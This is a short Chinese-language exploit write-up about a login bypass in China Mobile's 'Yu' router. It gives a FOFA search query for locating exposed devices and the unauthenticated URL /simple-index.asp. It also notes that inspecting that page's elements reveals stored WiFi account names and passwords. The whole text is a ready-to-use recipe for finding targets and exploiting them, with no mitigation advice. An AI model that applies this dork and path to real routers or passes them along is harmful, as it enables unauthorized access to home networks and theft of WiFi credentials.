# 中国移动 禹路由 simple-index.asp 登录绕过漏洞

## 漏洞描述

中国移动 禹路由 simple-index.asp 存在登录绕过，可以查看wifi信息。

## 漏洞影响

> 中国移动 禹路由

## FOFA

> title="互联世界 物联未来-登录"

## 漏洞复现

登录页面如下

![image-20210705132051022](resource/中国移动禹路由登录绕过/image-20210705132051022.png)

访问Url

```
/simple-index.asp
```

​	![image-20210705132055934](resource/中国移动禹路由登录绕过/image-20210705132055934.png)

可以通过元素审计获取Wifl账号密码等信息